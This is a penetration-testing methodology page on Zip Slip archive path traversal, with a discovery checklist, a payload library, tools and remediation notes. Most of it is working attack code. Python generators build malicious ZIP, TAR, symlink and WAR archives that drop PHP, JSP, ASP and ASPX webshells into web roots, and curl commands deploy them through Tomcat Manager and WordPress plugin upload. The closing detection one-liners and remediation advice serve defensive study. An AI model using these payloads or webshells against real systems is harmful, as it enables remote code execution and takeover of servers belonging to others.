---
title: "Zip Slip / Archive Path Traversal"
date: 2026-02-24
draft: false
---

# Zip Slip / Archive Path Traversal

> **Severity**: Critical | **CWE**: CWE-22, CWE-434
> **OWASP**: A04:2021 – Insecure Design

---

## What Is Zip Slip?

Zip Slip is a directory traversal vulnerability in archive extraction logic. When an archive contains a file with a path like `../../webroot/shell.php`, insecure extraction code writes the file **outside the intended target directory** — overwriting arbitrary files and enabling RCE via webshell drop.

Affected archive formats: **ZIP, TAR, GZ, TAR.GZ, BZ2, TGZ, AR, CAB, RPM, 7Z, WAR, EAR, JAR** (any format that supports subdirectories in file entries).

```
Malicious archive entry path:
  ../../../var/www/html/shell.php

Vulnerable extraction (Python):
  for member in zip.namelist():
      zip.extract(member, target_dir)   # ← no path check

Result: writes shell.php to /var/www/html/ regardless of target_dir
```

---

## Discovery Checklist

**Phase 1 — Find Archive Processing Endpoints**
- [ ] File upload accepting `.zip`, `.tar`, `.gz`, `.tgz`, `.war`, `.jar`, `.ear`
- [ ] Plugin/theme/extension upload in CMS (WordPress, Joomla, Drupal)
- [ ] Import features: import project, import config, import data
- [ ] Update/patch upload mechanisms
- [ ] Build artifact upload (CI/CD integration)
- [ ] Log archive download/upload features

**Phase 2 — Determine Extraction Library**
- [ ] Error messages: java.util.zip, python zipfile, Archive_Zip (PHP), Go archive/zip
- [ ] Server technology tells extraction library (Java → java.util.zip / Apache Commons Compress)
- [ ] Response timing on large archives

**Phase 3 — Exploitation**
- [ ] Generate malicious archive with traversal paths
- [ ] Test with harmless canary file first (`.txt` with unique content)
- [ ] Escalate to webshell if canary write confirmed
- [ ] Test multiple traversal depths (try `../` to `../../../../../../`)
- [ ] Test both `/` and `\` path separators (Windows vs Linux)
- [ ] Test target-specific writable paths (web root, config dir, cron dir)

---

## Payload Library

### Payload 1 — Malicious ZIP Creation (Python)

```python
#!/usr/bin/env python3
"""
Zip Slip payload generator — creates malicious ZIP with path traversal entries
"""
import zipfile, os, sys

def create_zipslip(output_file, traversal_depth=5, target_ext=".php",
                   shell_content=None):
    """Create ZIP with multiple traversal depth variants"""

    if shell_content is None:
        shell_content = b'<?php system($_GET["cmd"]); ?>'

    # Common web root paths to try:
    targets = [
        # Linux web roots:
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/usr/share/nginx/html/shell.php",
        "/srv/http/shell.php",
        "/opt/tomcat/webapps/ROOT/shell.php",
        # Relative traversal variants:
        "../shell.php",
        "../../shell.php",
        "../../../shell.php",
        "../../../../var/www/html/shell.php",
        # Windows IIS:
        "../inetpub/wwwroot/shell.asp",
    ]

    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add a legitimate file to look benign:
        zf.writestr("readme.txt", "This is a legitimate archive.")

        # Add traversal payloads at multiple depths:
        for depth in range(1, traversal_depth + 1):
            traversal = "../" * depth
            filename = f"{traversal}shell{target_ext}"
            print(f"  Adding: {filename}")
            zf.writestr(filename, shell_content)

        # Specific web root targets:
        for t in targets[:5]:
            zf.writestr(t, shell_content)

    print(f"[+] Created: {output_file}")

# Example shells by language:
shells = {
    "php": b'<?php system($_GET["cmd"]); ?>',
    "jsp": b'<%@ page import="java.util.Scanner,java.lang.Runtime" %><% String cmd=request.getParameter("cmd"); Runtime rt=Runtime.getRuntime(); String[] commands={"/bin/bash","-c",cmd}; Process proc=rt.exec(commands); Scanner s=new Scanner(proc.getInputStream()).useDelimiter("\\A"); String result=s.hasNext()?s.next():""; out.println(result); %>',
    "asp": b'<%Response.Write(CreateObject("WScript.Shell").Exec(Request.Form("cmd")).StdOut.ReadAll())%>',
    "aspx": b'<%@ Page Language="C#"%><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput).ReadToEnd():"error");%>',
}

if __name__ == "__main__":
    create_zipslip("zipslip_php.zip", target_ext=".php",
                   shell_content=shells["php"])
    create_zipslip("zipslip_jsp.zip", target_ext=".jsp",
                   shell_content=shells["jsp"])
```

### Payload 2 — TAR Archive Zip Slip

```python
#!/usr/bin/env python3
import tarfile, io

def create_tar_slip(output_file, depth=5):
    """TAR archive with path traversal entries"""
    with tarfile.open(output_file, "w:gz") as tar:
        # Add legitimate file:
        info = tarfile.TarInfo("readme.txt")
        data = b"Legitimate archive"
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))

        # Traversal entries:
        for d in range(1, depth + 1):
            traversal = "../" * d + "shell.php"
            shell = b'<?php system($_GET["cmd"]); ?>'
            info = tarfile.TarInfo(traversal)
            info.size = len(shell)
            tar.addfile(info, io.BytesIO(shell))
            print(f"  Added: {traversal}")

        # Absolute path (some extractors follow absolute paths):
        for path in ["/var/www/html/shell.php",
                     "/tmp/shell.php",
                     "/srv/www/shell.php"]:
            shell = b'<?php system($_GET["cmd"]); ?>'
            info = tarfile.TarInfo(path)
            info.size = len(shell)
            tar.addfile(info, io.BytesIO(shell))
            print(f"  Added absolute: {path}")

create_tar_slip("zipslip.tar.gz")
```

### Payload 3 — Symlink-Based Zip Slip (Java / Go)

```python
#!/usr/bin/env python3
"""
Symlink attack — archive contains symlink pointing outside target dir
When extracted and then accessed: traversal to arbitrary file
"""
import zipfile, struct

def create_symlink_zip(output_file, link_name, link_target):
    """
    Create ZIP with Unix symlink entry
    link_name: name of the symlink in the archive (e.g., 'logs')
    link_target: where it points (e.g., '/etc' or '../../../etc')
    """
    with zipfile.ZipFile(output_file, 'w') as zf:
        info = zipfile.ZipInfo(link_name)
        # Unix symlink: external_attr = 0xA1ED0000
        info.external_attr = 0xA1ED0000   # symlink flag
        info.compress_type = zipfile.ZIP_STORED
        zf.writestr(info, link_target)

        # Second entry: access via the symlink
        # If app reads archive_entry/sensitive_file → follows symlink
        zf.writestr("readme.txt", "Normal file")

# Examples:
create_symlink_zip("symlink_slash.zip", "data", "/")
# After extraction: data/ → / (entire filesystem!)
# Access: target.com/uploads/data/etc/passwd

create_symlink_zip("symlink_etc.zip", "config", "/etc")
# Access: target.com/uploads/config/passwd

create_symlink_zip("symlink_traverse.zip", "assets", "../../")
# Access: target.com/uploads/assets/config.php
```

### Payload 4 — WAR/JAR Zip Slip (Java Application Servers)

```bash
# WAR file = ZIP with specific structure
# Deploying malicious WAR to Tomcat/GlassFish/JBoss

# Create WAR with traversal entries targeting Tomcat webapps:
python3 -c "
import zipfile

with zipfile.ZipFile('exploit.war', 'w') as z:
    # Legitimate WAR content:
    z.writestr('WEB-INF/web.xml', '''<?xml version=\"1.0\"?>
<web-app xmlns=\"http://java.sun.com/xml/ns/javaee\" version=\"2.5\">
  <display-name>exploit</display-name>
</web-app>''')

    # Traversal to other webapps:
    z.writestr('../ROOT/shell.jsp',
        '<%@ page import=\"java.util.Scanner,java.lang.Runtime\" %><%Runtime rt=Runtime.getRuntime();String[] c={\"/bin/bash\",\"-c\",request.getParameter(\"cmd\")};Process p=rt.exec(c);%><%=new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\").next()%>')

    # Traversal to config directory:
    z.writestr('../conf/shell.jsp', '<%=new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next()%>')
"

# Upload to Tomcat Manager:
curl -u admin:admin -X PUT \
  "http://target.com:8080/manager/text/deploy?path=/exploit&war=file:exploit.war" \
  -T exploit.war

# Or via REST API:
curl -u admin:admin \
  "http://target.com:8080/manager/text/deploy?path=/shell" \
  --upload-file exploit.war
```

### Payload 5 — WordPress/CMS Plugin Upload

```bash
# WordPress plugin upload expects a ZIP with plugin structure
# But extracts to wp-content/plugins/PLUGIN_NAME/
# Traversal escapes to wp-content/ or web root

python3 -c "
import zipfile

with zipfile.ZipFile('evil-plugin.zip', 'w') as z:
    # Legitimate plugin metadata:
    z.writestr('evil-plugin/evil-plugin.php', '''<?php
/*
Plugin Name: Evil Plugin
Plugin URI: https://evil.com
Description: Test
Version: 1.0
*/
// Legitimate-looking code
?>''')

    # Traversal entries:
    z.writestr('evil-plugin/../../shell.php',
        '<?php system(\$_GET[\"cmd\"]); ?>')

    # Target wp-config.php to extract secrets:
    # (read-only version via symlink or traversal in config reading)

    # Overwrite existing WordPress file:
    z.writestr('evil-plugin/../../../index.php',
        '<?php system(\$_GET[\"cmd\"]); ?>')

    # Write to wp-content/uploads (publicly accessible):
    z.writestr('evil-plugin/../../uploads/shell.php',
        '<?php system(\$_GET[\"cmd\"]); ?>')
"

# Upload via WordPress admin:
curl -s -X POST "https://target.com/wp-admin/update.php?action=upload-plugin" \
  -b "wordpress_logged_in=ADMIN_COOKIE" \
  -F "pluginzip=@evil-plugin.zip" \
  -F "_wpnonce=NONCE_VALUE"
```

### Payload 6 — Canary Test (Confirm Write Without RCE)

```python
#!/usr/bin/env python3
"""
Safe canary test — write unique file to confirm path traversal
without triggering dangerous code execution
"""
import zipfile, uuid

canary = str(uuid.uuid4())  # unique identifier
canary_content = f"ZIPSLIP_CANARY_{canary}".encode()

with zipfile.ZipFile("canary_test.zip", "w") as z:
    z.writestr("legit.txt", "Normal file content")

    # Test various depths:
    for depth in range(1, 7):
        traversal = "../" * depth
        z.writestr(f"{traversal}zipslip_canary.txt", canary_content)

    # Test specific paths:
    for path in ["/tmp/zipslip_canary.txt",
                 "/var/www/html/zipslip_canary.txt"]:
        z.writestr(path, canary_content)

print(f"[+] Canary value: {canary}")
print("[+] After uploading, check if these paths contain the canary:")
print("    /tmp/zipslip_canary.txt")
print("    /var/www/html/zipslip_canary.txt")
print("    <upload_dir>/../zipslip_canary.txt (various depths)")
```

---

## Tools

```bash
# evilarc — simple Zip Slip payload generator:
git clone https://github.com/ptoomey3/evilarc
python evilarc.py shell.php -o unix -d 5 -p var/www/html/ -f zipslip.zip

# zip_slip_generator.py (custom, see above)

# Detect if archive is malicious:
python3 -c "
import zipfile, sys
with zipfile.ZipFile(sys.argv[1]) as z:
    for name in z.namelist():
        if '..' in name or name.startswith('/'):
            print(f'[DANGEROUS] {name}')
        else:
            print(f'[OK] {name}')
" archive.zip

# Test extraction behavior manually:
mkdir /tmp/safe_extract_test
python3 -c "
import zipfile
with zipfile.ZipFile('zipslip.zip') as z:
    z.extractall('/tmp/safe_extract_test/')
"
ls -la /tmp/  # check if shell.php appeared outside safe_extract_test

# Check for Zip Slip with zipinfo:
zipinfo -1 suspicious.zip | grep "\.\."

# Quick malicious ZIP one-liner:
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../shell.php', '<?php system(\$_GET[\"c\"]); ?>')
    z.writestr('legit.txt', 'ok')
"

# TAR check:
tar -tvf suspicious.tar.gz | grep "\.\."
tar -tvf suspicious.tar.gz | grep "^/"   # absolute paths
```

---

## Remediation Reference

- **Normalize and validate entry paths**: after resolving the full path of each archive entry, verify it starts with the intended extraction directory
- **Canonical path check** (Java): `if (!entryFile.getCanonicalPath().startsWith(destDir.getCanonicalPath())) throw new IOException("Zip Slip!")`
- **Python**: use `os.path.realpath()` after joining destination + entry name; reject if outside destination
- **Reject `..` in entry names**: pre-filter any entry containing `../`, `..\`, or absolute paths
- **Reject symlinks in archives** if not required (most extraction use cases don't need symlink support)
- **Strip leading slashes**: never use absolute paths from archive entries
- **Library updates**: many ZIP libraries have added Zip Slip protections in recent versions — keep dependencies updated

*Part of the Web Application Penetration Testing Methodology series.*
